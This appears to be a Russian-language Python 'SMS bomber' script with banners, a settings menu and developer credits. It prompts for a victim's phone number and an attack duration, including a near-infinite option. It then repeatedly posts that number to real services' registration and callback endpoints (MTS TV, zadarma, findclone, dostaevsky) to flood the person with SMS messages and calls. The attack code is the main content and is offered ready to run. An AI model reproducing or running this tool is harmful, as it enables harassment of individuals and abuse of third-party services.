
#   Version 10.1
import requests, random, datetime, sys, time, argparse, os , colorama ,pickle
from colorama import Fore, Back, Style
from colorama import init
from Banners import start
from Banners import banner3
from Banners import banner4
from Banners import banner1an
from Banners import banner2an
from Banners import kol2
oso = os.name
init()




#Баннер старта 
os.system("clear")
start()
input()


#Баннер cПАМЕРА
os.system("clear")

if oso == "posix":
    banner1an()
else:
    banner2an()


if oso == "posix":
    banner3()
else:
    banner4()


message1 = "\n Изменения применены!"
message8 = """    \n Разработчики:  
                  \n                                      
                  \n Создатель идеи/Разработчик:
                  \n \033[94mИван Зайцев\033[0m - https://vk.com/ivan_vzlom300 
                  \n                                      
                  \n \033[33mСоздатель эффектов/анимации:\033[0m 
                  \n \033[94mДима Чернышов\033[0m - https://vk.com/psih.odinochka  
                  \n                                     
                  \n \033[33mДистрибьютор/фиксер:\033[0m 
                  \n \033[94mddan9\033[0m - https://github.com/ddan9 
                  \n    
                                  
                                                                      """


print(Fore.GREEN)
time.sleep(1)
E = input("\n --][ МТС Версия ][-- \n\n Хотите попасть в настройки? (1 - Да | \033[31m2 - Нет\033[0m\033[32m) > \033[94m")
if E == str(1):
    print(Fore.GREEN)
    print("\n          [НАСТРОЙКИ] ")
    print("\n \033[94m[0] Разработчики \033[0m                             ")
    print("\n \033[32m[1] Время показа баннера (Сек)\033[0m  ")
    print("\n \033[32m[2] Выход\033[0m ")
    time.sleep(2)
    print(Fore.GREEN)
    p = input("\n [>] ")
    
    if p == str(1):
        kol2 =  input("\n Введите время не более 20! > ")
        for char in message1:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.01)
        p = input("\n Чтобы выйти введите (2) > ")

    if p == str(0):
        print(Fore.YELLOW)
        for char in message8:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.01)
        print(Fore.GREEN)
        p = input("\n Чтобы выйти введите (2) > ")

    if p == str(2):
        os.system("clear")
        if oso == "posix":
            banner3()
        else:
            banner4()

if E == str(2):
    os.system("clear")
    if oso == "posix":
        banner3()
    else:
        banner4()


def banner_atack2():
  print(Fore.GREEN)
  baner = """
			┏━━━┓┏┓     ┏┓
			┃┏━┓┣┛┗┓   ┏┛┗┓
			┃┗━━╋┓┏╋━━┳┻┓┏┛
			┗━━┓┃┃┃┃┏┓┃┏┫┃
			┃┗━┛┃┃┗┫┏┓┃┃┃┗┓
			┗━━━┛┗━┻┛┗┻┛┗━┛...
"""
  print(baner)
  print (" \033[31m[                    ]\033[33m \033[94m5%\033[0m")
  time.sleep(0.1)
  print (" \033[31m[=====               ]\033[33m \033[94m35%\033[0m")
  time.sleep(1)
  print (" \033[31m[==========          ]\033[33m \033[94m52%\033[0m")
  time.sleep(1)
  print (" \033[31m[====================]\033[33m \033[94m100%\033[0m")
  time.sleep(2)
  print(Fore.RED)

  for char in message4:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.01)





def banner_atack():
  print(Fore.YELLOW)
  print("""        _       _             _      ____  _             _   _             
       / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
      / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
     / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
    /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                     |___/ ......""")
  print ("  \033[31m[                    ]\033[33m \033[94m5%\033[0m")
  time.sleep(0.1)
  print ("  \033[31m[=====               ]\033[33m \033[94m35%\033[0m")
  time.sleep(1)
  print ("  \033[31m[==========          ]\033[33m \033[94m52%\033[0m")
  time.sleep(1)
  print ("  \033[31m[====================]\033[33m \033[94m100%\033[0m")
  time.sleep(2)
  print(Fore.RED)
  for char in message4:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.01)


R = 0
message7 = "\033[94m \n Чтобы выйти из программы, нажмите Ctrl + C\033[0m"
message5 = "\033[94m \n ЧТо бы вЫйти из прОграМмы нАжмиТе Ctrl + C иЛи на КРЕСТИК в пРавоМ верХнем угЛу. \033[0m"
if oso == "posix":
    for char in message7:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)

else:
    for char in message5:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)

print(Fore.RED)
_phone = input('\n \033[31mВведите номер (Без +) > \033[0m\033[94m')
message4 =  "Начинаем атаку на || " + str(_phone)+ " || \033[94mDDOS SMS Атака (Только МТС)\033[0m \n"

if _phone[0] == '+':

    _phone = _phone[1:]

if _phone[0] == '8':

    _phone = '7'+_phone[1:]

if _phone[0] == '9':

    _phone = '7'+_phone

kol = input("\n \033[31mВремя атаки (Сек) (Введите больше 30 | 0 - бесконечно) > \033[0m\033[94m ")
if kol == str(0):
    kol = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
start_time = time.time() 
CLOSE_AFTER = kol
call = input("\n \033[31mТип атаки (1 - Атака звонками (НЕ РАБОТАЕТ) | 2 - SMS Атака (Только МТС)) > \033[0m\033[94m")
if call == str(1):
    os.system("clear")

    if oso == "posix":
        banner_atack2()
    else:
        banner_atack()
    
    while True:      	
      if time.time() > start_time + float(CLOSE_AFTER): 
        print(Fore.RED)
        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
        break
      try:
        requests.post('https://my.zadarma.com/connect/', params={"?number=": '+' + _phone})
        print(Fore.GREEN)
        print('[+] zadarma звонок отправлен!')
      except:
        print(Fore.RED)
        print('[-] Не удалось отправить запрос на звонок! (zadarma) ')

      if time.time() > start_time + float(CLOSE_AFTER):
        print(Fore.RED)
        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
        break
      try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print(Fore.GREEN)

        print('[+] findclone звонок отправлен!')
      except:
        print(Fore.RED)
        print('[-] Не удалось отправить запрос на звонок! (findclone)')

      if time.time() > start_time + float(CLOSE_AFTER):
        print(Fore.RED)
        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
        break

      try:
        requests.post('https://msk.dostaevsky.ru/ajax/feedback/', params={"back_call": '+' + _phone})
        print(Fore.GREEN)
        print('[+] dostaevsky звонок отправлен!')
      except:
        print(Fore.RED)
        print('[-] Не удалось отправить запрос на звонок! (dostaevsky)')
      time.sleep(0.8)




if call == str(2):
    start_time = time.time() 
    CLOSE_AFTER = kol
    os.system("clear")
    if oso == "posix":
        banner_atack2()
    else:
        banner_atack()
    print(Fore.GREEN)

    while True:
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Нажмите ENTER для закрытия...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(3)
        except:
            print('[-] Ошибка при отправке!')

    input()

_name = ''

for x in range(12):


    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))



_phone9 = _phone[1:]

_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]

_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]

_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]







        


